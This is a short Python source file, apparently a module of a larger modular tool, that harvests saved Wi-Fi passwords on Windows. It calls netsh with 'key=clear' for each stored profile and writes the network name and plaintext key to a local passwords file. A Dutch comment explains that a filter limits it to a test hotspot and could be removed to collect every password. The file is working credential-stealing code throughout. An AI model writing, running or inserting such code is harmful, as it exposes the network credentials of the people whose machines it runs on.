from basemodule import BaseModule
import subprocess


class Wifi_password(BaseModule):
    def run(self):
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
        output = result.stdout
        profile_names = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]
        for name in profile_names:
            result = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True,
                                    text=True)
            output = result.stdout
            password_line = [line.split(":")[1].strip() for line in output.split("\n") if "Key Content" in line]

            # Hier doe ik even als voorbeeld een test hotspot genomen aangezien ik geen echte credentials op het
            # internet wil zetten. De if statement zou dus normaal weg kunnen zodat we alle passwords verkrijgen.
            if "ConferenceRoom" in name:
                password = password_line[0]
                with open("../passwords/passwords.txt", "w") as password_file:
                    password_file.write(f"WiFi Name: {name}, Password: {password}")
